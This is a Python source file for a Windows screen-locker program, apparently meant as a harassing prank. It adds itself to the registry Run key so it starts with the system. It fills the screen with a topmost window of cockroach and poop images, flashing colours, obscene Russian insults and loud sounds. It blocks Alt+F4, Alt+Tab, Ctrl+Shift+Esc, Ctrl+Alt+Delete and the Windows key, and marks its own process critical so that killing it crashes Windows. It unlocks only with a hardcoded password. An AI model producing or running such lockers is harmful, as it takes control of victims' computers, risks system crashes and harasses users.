import tkinter as tk
from PIL import Image, ImageTk
import requests
from io import BytesIO
import random
import time
import pygame
import os
import ctypes
import keyboard
import winreg as reg
import sys

def add_to_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Zaluper", 0, reg.REG_SZ, sys.executable + " " + os.path.abspath(__file__))
        reg.CloseKey(key)
    except Exception as e:
        pass  


def remove_from_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(key, "Zaluper")
        reg.CloseKey(key)
    except Exception as e:
        pass  

add_to_startup()

pygame.mixer.init()

sound_folder = "sounds"
sound_files = ["allah.mp3", "lolo.mp3", "skibidi.mp3"]
sound_paths = [os.path.join(sound_folder, f) for f in sound_files]

current_volume = 10

sounds = []
for path in sound_paths:
    try:
        sound = pygame.mixer.Sound(path)
        sound.set_volume(current_volume)
        sound.play()
        sounds.append(sound)
    except Exception as e:
        pass

try:
    pygame.mixer.music.load("fart.mp3")
    pygame.mixer.music.set_volume(current_volume)
    pygame.mixer.music.play(-1)
except:
    pass

root = tk.Tk()
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
width, height = root.winfo_screenwidth(), root.winfo_screenheight()
root.title("ТАРАКАНИЙ ПИЗДЕЦ АПОКАЛИПСИС")

cockroach_urls = [
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ0itMdf6w_WnPp77QY9Vj6a74hKtjp4p0iTw&s",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSqquViuVntXakRPfso52c9tW6uPN-q1HKgWg&s",
    "https://foni.papik.pro/uploads/posts/2024-10/foni-papik-pro-2flq-p-kartinki-vas-zametili-na-prozrachnom-fone-7.png",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGRx3AI95GBoq-w9JyGhk83Yptsgpffw_t3g&s",
    "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSfoX1Y5weAOJfcTzO4O2lDAdgKdQ7bXy1o9g&s"
]
poop_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRtLeFgK-PUFVqX_-jPxwXB1ZzEa0YjMsHGsQ&"
bg_url = "https://i1.sndcdn.com/artworks-432qAz1vPtD5ibk2-YIz0Gg-t500x500.jpg"

def load_image_from_url(url, size):
    try:
        response = requests.get(url)
        img_data = BytesIO(response.content)
        img = Image.open(img_data).resize(size)
        return ImageTk.PhotoImage(img)
    except Exception as e:
        exit()

cockroach1_img = load_image_from_url(cockroach_urls[0], (100, 60))
cockroach2_img = load_image_from_url(cockroach_urls[1], (100, 60))
poop_img = load_image_from_url(poop_url, (40, 40))
bg_img = load_image_from_url(bg_url, (width, height))

canvas = tk.Canvas(root, width=width, height=height, highlightthickness=0)
canvas.pack(fill="both", expand=True)
canvas.create_image(0, 0, image=bg_img, anchor="nw")

kris_text = canvas.create_text(width//2, 50, text="KrisRummer", font=("Arial", 40, "bold"), fill="white")

def blink_kris():
    colors = ["red", "yellow", "lime", "cyan", "magenta", "white"]
    canvas.itemconfig(kris_text, fill=random.choice(colors))
    root.after(500, blink_kris)

blink_kris()

class Cockroach:
    def __init__(self, canvas):
        self.canvas = canvas
        self.x = random.randint(0, width)
        self.y = random.randint(0, height)
        self.speed_x = random.choice([-12, -10, 10, 12])
        self.speed_y = random.choice([-12, -10, 10, 12])
        self.image = random.choice([cockroach1_img, cockroach2_img])
        self.id = canvas.create_image(self.x, self.y, image=self.image)

    def move(self):
        self.x += self.speed_x
        self.y += self.speed_y
        if self.x <= 0 or self.x >= width - 100:
            self.speed_x = -self.speed_x
        if self.y <= 0 or self.y >= height - 60:
            self.speed_y = -self.speed_y
        self.canvas.coords(self.id, self.x, self.y)

class Poop:
    def __init__(self, canvas):
        self.canvas = canvas
        self.x = random.randint(0, width)
        self.y = 0
        self.speed_y = random.randint(15, 25)
        self.id = canvas.create_image(self.x, self.y, image=poop_img)

    def move(self):
        self.y += self.speed_y
        if self.y > height:
            self.y = 0
            self.x = random.randint(0, width)
        self.canvas.coords(self.id, self.x, self.y)

class FlyingText:
    def __init__(self, canvas):
        self.canvas = canvas
        self.texts = ["привет педофил", "ты гей", "хуй тебе", "жопа мира", "похер всё", "ебать хаос", "соси мои яйца"]
        self.text = random.choice(self.texts)
        self.x = random.randint(0, width)
        self.y = random.randint(0, height)
        self.speed_x = random.choice([-8, -6, 6, 8])
        self.speed_y = random.choice([-8, -6, 6, 8])
        self.colors = ["red", "yellow", "lime", "cyan", "magenta"]
        self.id = canvas.create_text(self.x, self.y, text=self.text, font=("Arial", random.randint(20, 40)), fill=random.choice(self.colors))

    def move(self):
        self.x += self.speed_x
        self.y += self.speed_y
        if self.x <= 0 or self.x >= width:
            self.speed_x = -self.speed_x
        if self.y <= 0 or self.y >= height:
            self.speed_y = -self.speed_y
        self.canvas.coords(self.id, self.x, self.y)
        if random.random() < 0.1:
            self.canvas.itemconfig(self.id, fill=random.choice(self.colors))

def check_input(event):
    global current_volume
    if entry.get().lower() == "zalupa":
        remove_from_startup()  
        pygame.mixer.music.stop()
        for sound in sounds:
            sound.stop()
        root.destroy()
    else:
        current_volume = min(current_volume + 0.2, 1.0)
        pygame.mixer.music.set_volume(current_volume)
        for sound in sounds:
            sound.set_volume(current_volume)
        entry.delete(0, tk.END)

cockroaches = [Cockroach(canvas) for _ in range(70)]
poops = [Poop(canvas) for _ in range(80)]
texts = [FlyingText(canvas) for _ in range(20)]

panic_colors = ["white", "red", "black", "yellow", "lime"]
def panic_effect():
    canvas.configure(bg=random.choice(panic_colors))
    if random.random() < 0.3:
        x, y = random.randint(0, width), random.randint(0, height)
        flash = canvas.create_rectangle(x, y, x+200, y+200, fill=random.choice(panic_colors), outline="")
        root.after(100, lambda: canvas.delete(flash))
    root.after(30, panic_effect)

def update():
    for cockroach in cockroaches:
        cockroach.move()
    for poop in poops:
        poop.move()
    for text in texts:
        text.move()
    root.after(15, update)

entry = tk.Entry(root, font=("Arial", 18))
entry.place(x=width//2-200, y=height-100, width=400)
entry.bind("<Return>", check_input)
canvas.create_text(width//2, height-130, text="Введи пароль! или те пизда НАХУЙ", font=("Arial", 16), fill="red")

def insert_nonsense():
    entry.insert(tk.END, "СОСИ ХУЙ ТВОЕМУ ПК ЩА ПИЗДЕЦ БУДЕТ АХАХАХАХХА")

panic_effect()
update()

root.protocol("WM_DELETE_WINDOW", lambda: None)

ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)

keyboard.block_key('windows')
keyboard.add_hotkey('alt+f4', insert_nonsense, suppress=True)
keyboard.add_hotkey('ctrl+alt+delete', insert_nonsense, suppress=True)
keyboard.add_hotkey('ctrl+shift+esc', insert_nonsense, suppress=True)
keyboard.add_hotkey('alt+tab', insert_nonsense, suppress=True)

root.mainloop()
